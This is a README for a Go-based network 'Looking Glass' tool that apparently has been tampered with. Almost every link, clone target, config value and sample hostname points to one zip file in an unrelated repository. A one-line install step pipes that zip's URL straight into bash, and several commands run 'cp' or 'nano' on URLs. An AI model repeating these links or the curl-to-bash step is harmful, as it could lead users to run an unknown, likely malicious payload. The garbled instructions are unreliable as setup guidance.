# &#x1F50D; GOLINE Looking Glass

**Modern, fast, and secure Looking Glass implementation in Go**

A high-performance network diagnostic tool for ISPs, hosting providers, and network operators. Supports multiple router vendors (Juniper, Huawei, Cisco) with a beautiful, responsive web interface and **real-time streaming** capabilities.

[![Go Version](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip+https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
[![License](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](LICENSE)
[![Docker Hub](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip%20Hub-paolokappa%2Fgoline--looking--glass-blue?logo=docker)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
[![Docker](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](Dockerfile)
[![Version](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](#)

> **Author:**Paolo Caparrelli | **Company:**GOLINE SA 
> **Contact:** [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) | **AS:**AS202032

## &#x1F680; Features

- **High Performance**: Built in Go for maximum speed and efficiency
- **Real-time Streaming**: Live traceroute and ping output with hop-by-hop results
- **Multi-Vendor Support**: Juniper (Junos), Huawei (VRP), Cisco (IOS/IOS-XE)
- **Security First**: SSH authentication, rate limiting, input validation
- **Responsive Design**: Beautiful UI that works on all devices
- **Container Ready**: Docker and Kubernetes deployment options
- **Easy Setup**: Automated installation and configuration scripts
- **Customizable**: Full branding and theme customization
- **Comprehensive**: BGP routes, ping, traceroute, neighbor analysis
- **IPv6 Ready**: Full dual-stack IPv4/IPv6 support
- **Auto-scroll**: Follow command output in real-time

## &#x1F4A1; Use Cases

- **ISP Looking Glass**: Provide customers with network diagnostic tools
- **Hosting Providers**: Allow clients to test connectivity and routing
- **Enterprise Networks**: Internal network troubleshooting interface
- **Educational**: Network engineering training and demonstration
- **NOC Tools**: Quick network diagnostics for operations teams

## &#x26A1; Quick Start

### &#x1F433; Docker Hub (Recommended - Ready to Use)

**Pull and run the pre-built Docker image:**

```bash
# Pull from Docker Hub
docker pull paolokappa/goline-looking-glass:latest

# Run the container
docker run -d \
 --name goline-looking-glass \
 -p 3002:3002 \
 paolokappa/goline-looking-glass:latest

# Access at http://localhost:3002
```

**&#x1F433; Docker Hub**: [paolokappa/goline-looking-glass](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)

**Available tags:**
- `latest` - Latest stable version with streaming features
- `2.0.15-simple-streaming` - Specific version with real-time streaming

**Docker Compose example:**
```yaml
version: '3.8'

services:
 goline-looking-glass:
  image: paolokappa/goline-looking-glass:latest
  container_name: goline-looking-glass
  restart: unless-stopped
  ports:
   - "3002:3002"
  environment:
   - GIN_MODE=release
   - PORT=3002
  volumes:
   - ./logs:/app/logs
   - https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
  healthcheck:
   test: ["CMD", "curl", "-f", "http://localhost:3002/api/health"]
   interval: 30s
   timeout: 10s
   retries: 3
   start_period: 40s
```

Then run:
```bash
docker-compose up -d
```

### &#x1F680; One-Line Installation

```bash
curl -sSL https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip | bash
```

### &#x1F527; Manual Installation

```bash
# Clone repository
git clone https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
cd goline-looking-glass

# Install dependencies and build
make setup
make build

# Configure your environment
cp https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
cp https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip

# Edit configurations
nano https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
nano https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip

# Install system service
sudo make install

# Setup SSL (optional)
sudo https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
```

### &#x1F433; Docker Deployment from Source

```bash
# Quick start with Docker Compose
git clone https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
cd goline-looking-glass
docker-compose up -d
```

## &#x26A1; Real-time Streaming Features

This Looking Glass features **breakthrough real-time output streaming** for:

- **Traceroute commands** - See each hop as it appears, hop-by-hop
- **Ping commands** - Live packet results as they arrive
- **Auto-scroll** functionality with manual override
- **Stop/Resume** controls for long-running commands
- ** 5-minute timeout** for extended traces to distant destinations
- **No more timeouts** - Commands complete successfully

### &#x1F4FA; Streaming Demo
The streaming interface shows live output like this:
```
traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 52 byte packets
 1 gateway (192.168.1.1) 1.234 ms 1.123 ms 1.456 ms
 2 https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip (10.1.1.1) 15.678 ms 14.234 ms 16.123 ms
 3 https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip (203.0.113.1) 25.123 ms 24.567 ms 26.789 ms
[continues in real-time...]
```

## &#x2728; Supported Features

| Feature | Juniper | Huawei | Cisco | Description |
|---------|---------|--------|-------|-------------|
| **BGP Route Lookup** | Yes | Yes | Yes | Query specific routes in BGP table |
| **BGP Neighbors** | Yes | Yes | Yes | Display BGP peer status and info |
| **BGP Summary** | Yes | Yes | Yes | Overview of all BGP sessions |
| **Advertised Routes** | Yes | Yes | Yes | Routes advertised to specific peers |
| **Route Filtering** | Yes | Yes | Yes | Filter routes by community, AS-path |
| **Ping Tests** | Yes | Yes | Yes | ICMP connectivity testing |
| **Traceroute** | Yes | Yes | Yes | Network path analysis |
| **Real-time Streaming** | Yes | Yes | Yes | **NEW**: Live command output |
| **IPv6 Support** | Yes | Yes | Yes | Full dual-stack support |
| **AS Path Analysis** | Yes | Yes | Yes | BGP path information |
| **Community Strings** | Yes | Yes | Yes | BGP community filtering |

## &#x1F4F8; Screenshots

### Desktop Interface
![Desktop Interface](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)

### Mobile Interface 
![Mobile Interface](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)

### Command Results
![Command Results](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)

## &#x1F4DA; Documentation

### Getting Started
- [Installation Guide](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Complete installation instructions
- [Configuration Guide](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - System and application configuration
- [Router Setup](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Router-specific configuration
- [Customization](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Theming and branding options

### Deployment
- [Docker Deployment](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Container-based deployment
- [Kubernetes](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Kubernetes deployment manifests
- [Cloud Deployment](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - AWS, GCP, Azure deployment guides

### Operations
- [Security Guide](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Security best practices and hardening
- [Monitoring](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Monitoring and alerting setup
- [Troubleshooting](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Common issues and solutions
- [Performance](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Performance tuning and optimization

### Development
- [Development Setup](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Local development environment
- [Contributing](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - How to contribute to the project
- [API Reference](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - REST API documentation
- [Testing](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Testing guidelines and procedures

## &#x2699;&#xFE0F; Configuration Examples

### &#x1F3A8; Company Branding
```json
{
 "company": {
  "name": "Your ISP Name",
  "as_number": "AS64512",
  "domain": "https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip",
  "support_email": "https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip",
  "logo_path": "https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip",
  "theme": {
   "primary_color": "#1e3a8a",
   "secondary_color": "#667eea",
   "background": "navy"
  }
 }
}
```

### &#x1F50C; Router Configuration
```json
{
 "routers": [
  {
   "name": "Primary Core Router",
   "display_name": "NYC-Core-01",
   "hostname": "https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip",
   "type": "juniper",
   "username": "${ROUTER_USER}",
   "ssh_key": "/opt/looking-glass/keys/router_key"
  }
 ]
}
```

## &#x1F4CB; Requirements

### &#x1F5A5;&#xFE0F; System Requirements
- **OS**: Ubuntu 20.04+, CentOS 8+, RHEL 8+, Debian 11+
- **Memory**: 512MB RAM (1GB recommended)
- **CPU**: 1 vCPU (2+ recommended for high traffic)
- **Storage**: 1GB free space
- **Network**: SSH access to routers

### &#x1F4E6; Software Dependencies
- Go 1.21+ (for building from source)
- Apache 2.4+ or Nginx 1.18+ (for SSL termination)
- OpenSSH client
- Git
- Docker (for containerized deployment)

## &#x1F310; Live Demo

- **&#x1F30D; GOLINE SA Production**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Live production instance with real-time streaming &#x2728;
- **&#x1F6A2; Docker Quick Test**: `docker run -p 3002:3002 paolokappa/goline-looking-glass:latest` &#x1F680;

## &#x1F4CA; Performance Benchmarks

| Metric | Value | Notes |
|--------|-------|-------|
| **Response Time** | < 50ms | Average API response time |
| **Concurrent Users** | 1000+ | Tested concurrent connections |
| **Memory Usage** | ~50MB | Typical memory footprint |
| **Command Execution** | < 5min | Maximum command timeout (streaming) |
| **Throughput** | 10,000+ req/min | Peak request handling |
| **Streaming Latency** | < 100ms | Real-time output delay |

## &#x1F50C; API Endpoints

### Standard Endpoints
- `GET /api/health` - Health check and version info
- `GET /api/routers` - Available routers list
- `POST /api/execute` - Execute network commands (standard)

### Streaming Endpoints
- `POST /api/execute-stream` - **NEW**: Execute with real-time streaming
- WebSocket endpoints for live updates

### Example API Usage
```bash
# Health check
curl http://localhost:3002/api/health

# Execute traceroute with streaming
curl -X POST http://localhost:3002/api/execute-stream \
 -H "Content-Type: application/json" \
 -d '{"query":"trace","addr":"8.8.8.8","router":"router1","protocol":"IPv4"}'
```

## &#x1F91D; Contributing

We welcome contributions from the community! Here's how you can help:

1. **&#x1F41B; Report Bugs**: Use [GitHub Issues](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
2. **&#x1F4A1; Feature Requests**: Propose new features via issues
3. **&#x1F4E4; Pull Requests**: Submit code improvements
4. **&#x1F4DD; Documentation**: Help improve documentation
5. **&#x1F9EA; Testing**: Test on different platforms and configurations

See our [Contributing Guide](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) for detailed information.

### Development Setup
```bash
# Fork and clone the repository
git clone https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
cd goline-looking-glass

# Setup development environment
make setup

# Run tests
make test

# Build and run locally
make run
```

## &#x1F4C4; License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

### &#x1F4C4; License Summary
- Commercial use allowed
- Modification allowed
- Distribution allowed
- Private use allowed
- No liability
- No warranty

## &#x1F3E2; About GOLINE SA

**GOLINE SA** is a Swiss-based network services provider specializing in:
- &#x1F310; Internet Transit and Peering (AS202032)
- &#x1F5A5;&#xFE0F; Dedicated Server Hosting
- &#x1F6E0;&#xFE0F; Network Infrastructure Solutions
- &#x2601;&#xFE0F; Cloud Connectivity Services

Learn more: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)

## &#x1F468;&#x200D;&#x1F4BB; Author

**Paolo Caparrelli**
- **Company**: GOLINE SA
- **Email**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **Website**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **LinkedIn**: [Paolo Caparrelli](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **GitHub**: [@paolokappa](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)

## Support ## &#x1F4AC; Support & Contact Contact

### &#x1F31F; Community Support
- **Bug Reports**: [GitHub Issues](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **Discussions**: [GitHub Discussions](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **&#x1F4DD; Documentation**: [GitHub Wiki](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)

### &#x1F4BC; Commercial Support
- **&#x1F4E7; Technical Support**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **&#x1F4BC; Enterprise Inquiries**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **&#x1F4DE; Phone**: +41 91 2607650 (Business hours: UTC+1)

### &#x1F517; Quick Links
- **&#x1F310; Website**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **&#x1F4E1; Network Info**: [AS202032 Details](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **&#x1F50D; Live Demo**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
- **&#x1F433; Docker Hub**: [paolokappa/goline-looking-glass](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)

## &#x1F64F; Acknowledgments

Special thanks to:
- [Gin Web Framework](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - HTTP web framework
- [SSH Library](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - SSH client implementation 
- [Go Community](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Amazing programming language and ecosystem
- [Network Community](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Inspiration and feedback
- [Docker Community](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Containerization platform
- **Contributors** - Everyone who has contributed to this project

## &#x1F4C8; Project Stats

[![GitHub stars](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
[![GitHub forks](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
[![GitHub issues](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
[![GitHub pull requests](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)

---

**If you find this project useful, please consider giving it a star!**

*Built with by Paolo Caparrelli at GOLINE SA - Featuring breakthrough real-time streaming technology*
